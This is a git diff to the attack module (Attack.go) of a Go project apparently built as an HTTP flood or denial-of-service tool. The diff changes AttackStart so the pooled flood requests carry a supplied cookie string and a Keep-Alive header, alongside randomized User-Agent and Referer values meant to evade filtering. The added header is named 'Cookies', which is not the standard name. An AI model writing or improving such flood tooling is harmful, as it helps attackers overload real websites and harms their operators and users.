@@ -1,7 +1,7 @@
 /*
  * @Author: NyanCatda
  * @Date: 2022-09-09 23:30:37
- * @LastEditTime: 2022-09-10 01:29:24
+ * @LastEditTime: 2022-09-10 01:58:22
  * @LastEditors: NyanCatda
  * @Description: 攻击模块
  * @FilePath: \Momoi\Attack.go
@@ -75,7 +75,7 @@ var refererHeaders = []string{
  * @param {int} PoolNum 线程池内线程数量
  * @return {*}
  */
-func AttackStart(URL string, PoolNum int) {
+func AttackStart(URL string, Cookies string, PoolNum int) {
 	if PoolNum <= 0 {
 		PoolNum = 1
 	}
@@ -128,6 +128,8 @@ func AttackStart(URL string, PoolNum int) {
 			}
 			Reqest.Header.Set(HeaderValue[0], HeaderValue[1])
 		}
+		Reqest.Header.Set("Connection", "Keep-Alive")
+		Reqest.Header.Set("Cookies", Cookies)
 		Reqest.Header.Set("User-Agent", CreateUserAgent())
 		Reqest.Header.Set("Referer", Random.StringArray(refererHeaders)+url.QueryEscape(URL))
 		AyaLog.DeBug("Attack", Reqest.Header)
